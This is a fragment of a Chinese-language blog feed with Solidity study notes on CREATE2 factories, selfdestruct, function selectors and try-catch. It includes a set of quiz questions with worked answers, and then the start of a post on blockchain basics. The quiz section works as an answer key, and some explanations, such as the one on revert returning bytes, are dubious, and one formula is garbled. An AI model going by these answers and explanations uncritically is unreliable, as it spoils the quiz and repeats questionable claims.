class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">    address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">    function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">        // 用tokenA和tokenB地址计算salt</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        // 用create2部署新合约</span><br><span class="line">        Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">        // 调用新合约的initialize方法</span><br><span class="line">        pair.initialize(tokenA, tokenB);</span><br><span class="line">        // 更新地址map</span><br><span class="line">        pairAddr = address(pair);</span><br><span class="line">        allPairs.push(pairAddr);</span><br><span class="line">        getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">        getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。</p><p>PairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure><p>就是利用<strong>CREATE2</strong>创建合约的代码，非常简单，<strong>而salt为token1和token2的hash：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">                bytes1(0xff),</span><br><span class="line">                address(this),</span><br><span class="line">                salt,</span><br><span class="line">                keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this))))</span><br><span class="line">            )))));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/19/eql9IWNVREGadJj.png" alt="3.png"></p><h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><ol><li>交易所为新用户预留创建钱包合约地址。</li><li>由 CREATE2 驱动的 factory 合约，在Uniswap V2中交易对的创建是在 Factory中调用CREATE2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。</li></ol><h2 id="selfdestruct"><a href="#selfdestruct" class="headerlink" title="selfdestruct"></a>selfdestruct</h2><ul><li><p>selfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。</p></li><li><p>不建议使用</p></li></ul><p>目前来说：</p><ol><li>已经部署的合约无法被<strong>SELFDESTRUCT</strong>了。</li><li>如果要使用原先的<strong>SELFDESTRUCT</strong>功能，必须在同一笔交易中创建并<strong>SELFDESTRUCT</strong></li></ol><h3 id="如何使用-1"><a href="#如何使用-1" class="headerlink" title="如何使用"></a>如何使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selfdestruct(_addr)；</span><br></pre></td></tr></table></figure><p>其中_addr是接收合约中剩余ETH的地址。_addr 地址不需要有receive()或fallback()也能接收ETH</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h3><ol><li><p>对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符<strong>onlyOwner</strong>进行函数声明。</p></li><li><p>当合约中有<strong>selfdestruct</strong>功能时常常会带来安全问题和信任问题，合约中的selfdestruct功能会为攻击者打开攻击向量(例如使用<strong>selfdestruct</strong>向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。</p></li></ol><h2 id="函数选择器Selector"><a href="#函数选择器Selector" class="headerlink" title="函数选择器Selector"></a>函数选择器Selector</h2><p><img src="https://s2.loli.net/2024/11/19/nYUMNWopbgLalG9.png" alt="4.png"></p><h3 id="msg-data"><a href="#msg-data" class="headerlink" title="msg.data"></a><strong>msg.data</strong></h3><p><strong>msg.data</strong>是<strong>Solidity</strong>中的一个全局变量，值为完整的<strong>calldata</strong>（调用函数时传入的数据</p><p>举例: </p><p>当参数为<code>0x2c44b726ADF1963cA47Af88B284C06f30380fC78</code>时，输出的<code>calldata</code>为</p><p><code>0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</code></p><p><strong>这段很乱的字节码可以分成两部分：</strong></p><p>前4个字节为函数选择器selector：<br> 0x6a627842</p><p> 后面32个字节为输入的参数：<br> <code>0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</code></p><p>其实<strong>calldata</strong>就是告诉智能合约，我要调用哪个函数，以及参数是什么。</p><h3 id="method-id、selector和函数签名"><a href="#method-id、selector和函数签名" class="headerlink" title="method id、selector和函数签名"></a><strong>method id、selector和函数签名</strong></h3><p><strong>method id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？</strong>**</p><p>简单介绍函数签名: 为**”函数名（逗号分隔的参数类型)”<strong>。举个例子，上面代码中</strong>mint<strong>的函数签名为</strong>“mint(address)”**。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。</p><p><strong>注意，在函数签名中，uint和int要写为uint256和int256。</strong></p><p>由于计算method id时，需要通过函数名和函数的参数类型来计算。</p><p><strong>在Solidity中，函数的参数类型主要分为：基础类型参数，固定长度类型参数，可变长度类型参数和映射类型参数。</strong></p><ol><li>基础类型参数</li></ol><p>solidity中，基础类型的参数有：uint256(uint8, … , uint256)、bool, address等。在计算method id时，只需要计算<code>bytes4(keccak256(&quot;函数名(参数类型1,参数类型2,...)&quot;))</code></p><ol start="2"><li>固定长度类型参数</li></ol><p>通常为固定长度的数组，例如：uint256[5]等因此，在计算该函数的method id时，只需要通过<code>bytes4(keccak256(&quot;fixedSizeParamSelector(uint256[3])&quot;))</code></p><p>即可。</p><ol start="3"><li>可变长度类型参数</li></ol><p>通常为可变长的数组，例如：address[]、uint8[]、string等，</p><p>因此在计算该函数的method id时，只需要通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes4(keccak256(&quot;nonFixedSizeParamSelector(uint256[],string)&quot;))</span><br></pre></td></tr></table></figure><p>即可。</p><ol start="4"><li>映射类型参数</li></ol><p>映射类型参数通常有：contract、enum、struct等。在计算method id时，需要将该类型转化成为ABI类型。因此，计算该函数的<strong>method id</strong>的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes4(keccak256(&quot;mappingParamSelector(address,(uint256,bytes),uint256[],uint8)&quot;))</span><br></pre></td></tr></table></figure><h3 id="使用selector"><a href="#使用selector" class="headerlink" title="使用selector"></a><strong>使用selector</strong></h3><p>我们可以利用<strong>selector</strong>来调用目标函数。例如我想调用<strong>elementaryParamSelector</strong>函数，我只需要利用<strong>abi.encodeWithSelector</strong>将<strong>elementaryParamSelector</strong>函数的<strong>method id</strong>作为<strong>selector</strong>和参数打包编码，传给<strong>call</strong>函数：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//使用selector来调用函数</span><br><span class="line">   function callWithSignature() external&#123;</span><br><span class="line">   ...</span><br><span class="line">     //调用elementaryParamSelector函数</span><br><span class="line">     (bool success1, bytes memory data1) = address(this).call(abi.encodeWithSelector(0x3ec37834, 1, 0));</span><br><span class="line">   ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="try-Catch"><a href="#try-Catch" class="headerlink" title="try Catch"></a>try Catch</h2><p>在 Solidity 中，try-catch 可以用来捕获以下几种异常：</p><ul><li>**revert()**：手动触发的异常，通常用于返回自定义错误消息。</li><li>**require()**：检查条件，如果条件不满足则触发异常，通常用于输入验证和状态检查。</li><li>**assert()**：用于检查不变量（internal     consistency），如果条件不满足会触发异常，并消耗所有剩余的 gas。这种异常通常表示程序中有严重错误。</li></ul><p>因此，try-catch 可以捕获 <strong>以上所有异常</strong>，但前提是它们发生在<strong>外部调用</strong>时。例如，当调用另一个合约或使用低级调用时发生异常，try-catch 可以捕获这些错误。</p><p><strong>try-catch</strong>只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() &#123;</span><br><span class="line">   //call成功的情况下 运行一些代码</span><br><span class="line"> &#125; catch &#123;</span><br><span class="line">   // call失败的情况下 运行一些代码</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。</p><p>同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。</p><p>如果调用的函数有返回值，那么必须在<strong>try</strong>之后声明<strong>returns(returnType val)<strong>，并且在</strong>try</strong>模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() returns(returnType val)&#123;</span><br><span class="line">   // call成功的情况下 运行一些代码</span><br><span class="line"> &#125; catch &#123;</span><br><span class="line">   // call失败的情况下 运行一些代码</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>另外，<strong>catch</strong>模块支持捕获特殊的异常原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">try externalContract.f() returns(returnType)&#123;</span><br><span class="line"></span><br><span class="line">  // call成功的情况下 运行一些代码</span><br><span class="line"></span><br><span class="line">&#125; catch Error(string memory /*reason*/ ) &#123;</span><br><span class="line"></span><br><span class="line">  // 捕获revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)</span><br><span class="line"></span><br><span class="line">&#125; catch Panic(uint /*errorCode*/) &#123;</span><br><span class="line"></span><br><span class="line">  // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界</span><br><span class="line"></span><br><span class="line">&#125; catch (bytes memory /*lowLevelData*/) &#123;</span><br><span class="line"></span><br><span class="line">  // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支</span><br><span class="line"></span><br><span class="line">  // 例如revert() require(false) revert自定义类型的error</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><ul><li>在代理合约中，存储所有相关的变量的是（），存储所有函数的是（），同时（）</li></ul><p>选择一个答案 </p><p>A. 代理合约; 逻辑合约; 代理合约delegatecall逻辑合约 </p><p>B. 代理合约; 逻辑合约; 逻辑合约delegatecall代理合约 </p><p>C. 逻辑合约; 代理合约; 代理合约delegatecall逻辑合约</p><p>D. 逻辑合约; 代理合约; 逻辑合约delegatecall代理合约</p><p><strong>解析</strong></p><p><strong>在代理合约模式中，通常有两个主要组成部分：代理合约和逻辑合约。它们的职责分配如下：</strong></p><ol><li><strong>代理合约 存储所有相关的变量：</strong></li></ol><p><strong>代理合约负责持有合约的状态（即存储变量）。这意味着合约的状态信息保存在代理合约中。</strong></p><ol start="2"><li><strong>逻辑合约 存储所有函数：</strong></li></ol><p><strong>逻辑合约包含具体的业务逻辑和函数实现。它不直接持有状态，而是通过 delegatecall 被代理合约调用。</strong></p><ol start="3"><li><strong>代理合约使用 delegatecall 调用逻辑合约：</strong></li></ol><p><strong>代理合约使用 delegatecall 调用逻辑合约中的函数。在这种调用方式下，逻辑合约中的代码在代理合约的上下文中执行，这意味着逻辑合约可以通过代理合约的状态变量进行操作。</strong></p><p><strong>因此，选项 A 是正确的，因为它准确地描述了代理合约和逻辑合约之间的关系和它们各自的职责。</strong></p><hr><ul><li><p>使用delegatecall对当前合约和目标合约的状态变量有什么要求？</p><p>选择一个答案</p><p>A. 变量名、变量类型、声明顺序都必须相同</p><p>B. 变量名可以不同，变量类型、声明顺序必须相同</p><p>C. 变量类型可以不同，变量名、声明顺序必须相同</p><p>D. 声明顺序可以不同，变量名、变量类型必须相同</p></li></ul><p><strong>解析</strong></p><ol><li><strong>状态变量在 delegatecall 中的作用</strong>：</li></ol><p>o 当使用 delegatecall 调用目标合约的函数时，该函数的执行是在调用合约的存储上下文中进行的。这意味着目标合约中使用的状态变量会直接影响调用合约中的状态变量。</p><ol start="2"><li><strong>变量名</strong>：</li></ol><p>o 变量名可以不同，这是因为在调用时，delegatecall 是根据存储位置而不是变量名来访问状态变量。只要存储顺序和类型匹配，变量名的不同不会影响操作。</p><ol start="3"><li><strong>变量类型</strong>：</li></ol><p>o 变量类型必须相同，因为 delegatecall 需要确保数据的正确解码和存储。若目标合约中使用的变量类型与调用合约的状态变量类型不一致，将导致数据解码错误，从而引发异常。</p><ol start="4"><li><strong>声明顺序</strong>：</li></ol><p>声明顺序必须相同，这是因为 Solidity 编译器在生成合约存储布局时是基于变量声明的顺序来分配存储位置的。如果顺序不同，虽然变量名可以不同，但不同的顺序会导致访问错误的数据位置</p><p>综上：选B</p><hr><ul><li>1个工厂合约PairFactory创建Pair合约的最大数量一般由什么决定？</li></ul><p>选择一个答案</p><p>A. 1个PairFactory只能创建1个pari合约</p><p>B. Pair合约逻辑</p><p>C. PairFactory合约逻辑</p><p><strong>解析</strong></p><p><strong>在 Solidity 中，工厂合约（如 PairFactory）的作用通常是用于批量创建和管理其他合约实例（例如 Pair 合约）。工厂合约能够创建的合约数量主要取决于工厂合约自身的逻辑。也就是说，PairFactory 中的代码决定了它创建 Pair 合约的具体规则和限制，例如是否允许创建多个 Pair 实例，或对创建数量施加其他限制。</strong></p><ul><li><strong>A. 1个PairFactory只能创建1个pair合约：不正确。工厂合约一般可以创建多个合约实例，具体数量取决于其逻辑实现。</strong></li><li><strong>B. Pair合约逻辑：不正确。Pair 合约的逻辑通常只影响其自身的行为和状态，而不是 PairFactory 合约创建 Pair 合约的数量。</strong></li><li><strong>C. PairFactory合约逻辑：正确。工厂合约的逻辑直接决定了它可以创建多少个 Pair 合约实例。</strong></li></ul><p><strong>因此，答案是 C。</strong></p><hr><ul><li>删除合约时，可以将合约中剩余的ETH发送出去： 选择一个答案 A. 正确 B. 错误</li></ul><p><strong>解析</strong></p><p><strong>在 Solidity 中使用 selfdestruct 删除合约时，可以将合约中剩余的 ETH 发送到指定的地址。selfdestruct(address payable recipient) 会销毁合约并将其剩余余额发送给 recipient 地址。因此，删除合约时确实可以将合约中的剩余 ETH 发送出去，选A。</strong></p><hr><ul><li><p>当我们调用智能合约时，传递给合约的数据的前若干个字节被称为“函数选择器 (Selector)”，它告诉合约我们想要调用哪个函数。假设我们想要调用的函数在智能合约中定义声明如下： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solidity Copy code function foo(uint256 n, address sender, string s) public view returns(bool b) </span><br></pre></td></tr></table></figure><p>那么该函数对应的函数选择器为： 选择一个答案 </p><p>A.<code> &quot;foo(uint256,address,string)&quot;</code></p><p>B. <code>&quot;foo(uint256 n, address sender, string s)&quot; </code></p><p>C. <code>keccak256(&quot;foo(uint256,address,string)&quot;) </code></p><p>D.<code>keccak256(&quot;foo(uint256 n, address sender, string s)&quot;)</code></p><p>E. <code>bytes4(keccak256(&quot;foo(uint256,address,string)&quot;)) </code></p><p>F. <code>bytes4(keccak256(&quot;foo(uint256 n, address sender, string s)&quot;))</code></p></li></ul><p><strong>解析</strong></p><p><strong>在 Solidity 中，函数选择器是由函数签名（函数名称和参数类型）经过 Keccak-256 哈希运算后生成的前 4 个字节。具体生成步骤如下：</strong></p><p><strong>1.</strong>   <strong>将函数的签名（包括函数名称和参数类型，但不包含参数名称）传入 keccak256 进行哈希计算。</strong></p><p>在这个例子中，函数签名为 <code>&quot;foo(uint256,address,string)&quot;</code></p><p><strong>2.</strong>   <strong>取 keccak256 哈希结果的前 4 个字节，形成 bytes4 类型的数据。</strong></p><p><strong>因此，正确答案是 bytes4(keccak256(“foo(uint256,address,string)”))。</strong></p><hr><ul><li><p>已知函数foo在智能合约中定义声明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solidity Copy code function foo(uint256 a) public view</span><br></pre></td></tr></table></figure><p> 而字符串<code>&quot;foo(uint256)&quot;</code>的keccak256哈希值为： <code>0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b</code> 那么，当我们希望调用函数foo()时，以下生成调用数据的写法中，正确且最节省gas的一项是： 选择一个答案</p><p> A.<code> abi.encodeWithSignature(&quot;foo(uint256)&quot;, a)</code> B.<code>abi.encodeWithSelector(&quot;foo(uint256)&quot;, a)</code></p><p>C.<code>abi.encodeWithSelector(bytes(keccak256(&quot;foo(uint256)&quot;)), a) </code></p><p>D. <code>abi.encodeWithSelector(bytes4(0x2fbebd38), a)</code></p></li></ul><p><strong>解析：</strong></p><p>·    <strong>在 Solidity 中，调用函数时可以通过函数的选择器（selector）生成调用数据。</strong></p><p>·    <strong>题目中已给出 “foo(uint256)” 的哈希值为 0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b，而选择器就是这个哈希值的前四个字节，即 0x2fbebd38。</strong></p><p>·    <strong>选项 D 使用了 abi.encodeWithSelector(bytes4(0x2fbebd38), a)，直接利用已知的选择器生成调用数据，这是最节省 gas 的写法，因为它避免了重复计算哈希值。</strong></p><p><strong>其他选项分析：</strong></p><p>·    <strong>A</strong> <strong>和 B 会导致额外的 gas 开销，因为它们需要在运行时计算 “foo(uint256)” 的哈希值。</strong></p><p>·    <strong>C</strong> <strong>中的 keccak256(“foo(uint256)”) 也会增加不必要的计算，因此会消耗更多的 gas。</strong></p><p><strong>正确答案选D</strong></p><hr><ul><li>如果对于某个哈希函数，我们统计大量不同字符串对应的哈希值（二进制串），发现其前 n 位全部为 0 的频率恰好约为 1&#x2F;2^n，则我们认为该哈希函数具有良好的：</li></ul><p> 选择一个答案 </p><p>A. 单向性 </p><p>B. 灵敏性 </p><p>C. 高效性 </p><p>D. 均一性 </p><p>E. 抗碰撞性</p><p><strong>解析</strong>：</p><p><strong>·    均一性（Uniformity）指的是哈希函数生成的哈希值在输出空间中均匀分布。若哈希函数具有均一性，则任意特定模式（如前 n 位为 0）在随机情况下出现的概率为 12n\frac{1}{2^n}2n1。</strong></p><p><strong>·    题目中的现象描述了哈希值分布的均匀性，符合均一性的定义。</strong></p><p><strong>其他选项分析：</strong></p><p><strong>·    单向性 是指给定哈希值很难逆向推出原始输入。</strong></p><p><strong>·    灵敏性 是指输入的细微变化（例如一位改变）会显著改变输出（哈希值）。</strong></p><p><strong>·    高效性 指的是哈希函数计算的速度。</strong></p><p><strong>·    抗碰撞性 是指很难找到不同输入生成相同的哈希值。</strong></p><p><strong>因此，D. 均一性 是最符合题意的选项。</strong></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address recipient, uint amount) external override returns (bool) &#123;</span><br><span class="line"></span><br><span class="line">balanceOf[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">balanceOf[recipient] += amount;</span><br><span class="line"></span><br><span class="line">emit Transfer(msg.sender, recipient, amount);</span><br><span class="line"></span><br><span class="line">return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transfer</strong>函数的函数签名是transfer(address uint256)</p><p><strong>transfer</strong>函数的选择器为0xa9059cbb</p><p><strong>解析</strong></p><p><strong>通过计算 keccak256(“transfer(address,uint256)”) 得到</strong></p><p>计算代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SelectorCalculator &#123;</span><br><span class="line">    function getTransferSelector() public pure returns (bytes4) &#123;</span><br><span class="line">        return bytes4(keccak256(&quot;transfer(address,uint256)&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ul><li>try-catch捕获到异常后是否会使try-catch所在的方法调用失败？</li></ul><p>选择一个答案 A. 会 B. 不会</p><p><strong>解析</strong></p><p> <strong>在 Solidity 中，try-catch 用于捕获外部合约调用或低级调用（如 .call）中可能发生的异常。当 try 块中的调用失败并触发异常时，程序流会进入 catch 块，而不会导致整个 try-catch 所在的函数失败。因此，只要 catch 块正确处理了异常，try-catch 所在的方法可以继续执行，不会因为捕获异常而失败。</strong></p><hr><ul><li>try代码块内的revert是否会被catch本身捕获？</li></ul><p>A. 会 B. 不会</p><p><strong>解析</strong></p><p><strong>因为Solidity 中，try-catch 结构用于捕获由外部调用（如其他合约的函数调用或低级调用）引发的异常。然而，try 代码块内部的 revert 并不会被同一 try-catch 结构的 catch 捕获。这是因为：</strong></p><ul><li><strong>try-catch</strong> <strong>只捕获外部合约调用中的异常。如果 try 块内的代码直接调用 revert()，这将导致该函数的整个执行环境被终止，无法进入 catch 块。</strong></li><li><strong>换句话说，try-catch 结构设计的目的是为了捕获异常以便处理，而 revert() 直接触发的异常会使当前调用栈中的所有状态都回滚，而不会跳转到 catch 块。</strong></li></ul><hr><ul><li>以下异常返回值类型为bytes的是： 选择一个答案 A. revert() B. require() C. assert() D. 以上都是 D是错的</li></ul><p><strong>解析： 在 Solidity 中，revert() 可以返回一个 bytes 类型的错误信息，例如自定义的错误消息，因此 revert() 的返回值类型为 bytes。这是为了提供详细的错误描述。</strong></p><ul><li><strong>require()</strong> <strong>和 assert() 通常不返回详细的错误数据，尤其是 assert()，它直接导致系统错误，并消耗所有剩余的 gas，不返回 bytes 类型的错误信息。</strong></li></ul><p><strong>因此，只有 A. revert() 返回 bytes 类型的错误信息。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链原理——区块链概念</title>
      <link href="/2024/11/18/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E5%8C%BA%E5%9D%97%E9%93%BE%E6%A6%82%E5%BF%B5/"/>
      <url>/2024/11/18/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E5%8C%BA%E5%9D%97%E9%93%BE%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="区块链的基本概念"><a href="#区块链的基本概念" class="headerlink" title="区块链的基本概念"></a><strong>区块链的基本概念</strong></h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><ul><li><p><strong>从字面上理解</strong>，区块链就是由多个记录数据的区块构成的链式数据结构。</p></li><li><p><strong>从技术角度来看</strong>，区块链是一种基于P2P网络架构的分布式账本技术系统：</p></li></ul><ol><li><strong>以“块-链”式数据结构来验证与存储账本数据</strong></li><li><strong>使用密码学方法保证数据传输和访问的安全</strong></li></ol><ul><li><strong>从应用角度来看</strong>，区块链是一种新型的无中介陌生人信任服务应用支撑平台系统。</li></ul><ol><li><strong>面向由陌生主体构成的开放网络环境</strong></li><li><strong>提供分布式账本记账服务</strong></li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><strong>去&#x2F;弱中心化</strong></li><li><strong>可溯源</strong></li><li><strong>不可篡改</strong></li><li>数字价值唯一性（采用<strong>共识机制和密码学方法</strong>实现）</li><li>智能合约</li><li>开放性</li><li>去信任</li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p><img src="https://s2.loli.net/2024/11/18/4ipaLYJ9kvxXzQE.png" alt="1.png"></p><h4 id="公有链"><a href="#公有链" class="headerlink" title="公有链"></a>公有链</h4><ul><li><strong>公有链（Public Blockchain），任何人（任何个体与组织）都可以参与区块链数据的维护和读取，数据完全开放透明，免费开放</strong></li><li><strong>目前全球最有影响力的公有链是比特币和以太坊系统。</strong></li></ul><h4 id="联盟链"><a href="#联盟链" class="headerlink" title="联盟链"></a><strong>联盟链</strong></h4><ul><li><strong>联盟链（Consortium Blockchain），联盟链即区块链共识建立的范围及公共账本的公开对象为有限主体，如行业联盟成员之间，联盟成员平等参与区块链网络构建、公共账本创建与维护。</strong></li><li><strong>联盟链系统一般都需要严格的身份认证和权限管理，节点的数量在一定时间段内也是确定的，适合处理组织间需要达成共识的业务，身份验证是联盟链与公有链最大区别</strong></li><li><strong>区块链典型的联盟链代表技术是开源的超级账本系统（Hyperledger Fabric）</strong></li></ul><h4 id="私有链"><a href="#私有链" class="headerlink" title="私有链"></a>私有链</h4><ul><li><strong>私有链（Private Blockchain）即区块链共识建立的范围及公共账本的公开对象为单一主体，单一主体对区块链的网络运行及数据处理、交换与存储具有全部权利</strong></li><li><strong>私有链通常具备完善的权限管理体系，要求使用者提交身份认证。</strong></li><li>​    <strong>私有链也可以看作是联盟链的一种特殊形态，即联盟中只有一个成员</strong></li></ul><h3 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h3><p><img src="https://s2.loli.net/2024/11/18/uy1IlHtoaj7YBqz.png" alt="3.png"></p><h2 id="区块链系统总体架构"><a href="#区块链系统总体架构" class="headerlink" title="区块链系统总体架构"></a>区块链系统总体架构</h2><p><strong>在体系结构上没有采用传统具有中心化服务器节点的C&#x2F;S或B&#x2F;S架构，而是采用无中心化节点的P2P体系结构</strong>（<strong>每个存储区块链与账本数据的网络节点都是对等关系</strong>）</p><h3 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a>系统逻辑架构</h3><p><img src="https://s2.loli.net/2024/11/18/iWlHQLKJU6TSgdM.png" alt="4.png"></p><h4 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a><strong>存储层</strong></h4><ul><li>存储层为区块链系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务</li><li>区块链系统一般采用的底层数据存储机制包括Key-Value数据库和文件系统。</li></ul><h4 id="数据层"><a href="#数据层" class="headerlink" title="数据层"></a>数据层</h4><ul><li>数据层是区块链系统的核心功能层级之一，负责定义区块链系统相关的区块、区块链、交易、账本、账户、地址等关键数据结构</li><li>并基于底层的存储服务提供对区块链数据的安全读写访问管理</li></ul><h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul><li>网络层是区块链系统的核心功能层级之一，负责定义区块链系统相关的P2P网络模型与通信协议</li><li>为区块链系统各网络节点之间提供节点发现与安全连接通信机制</li><li>为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制</li></ul><h4 id="共识层"><a href="#共识层" class="headerlink" 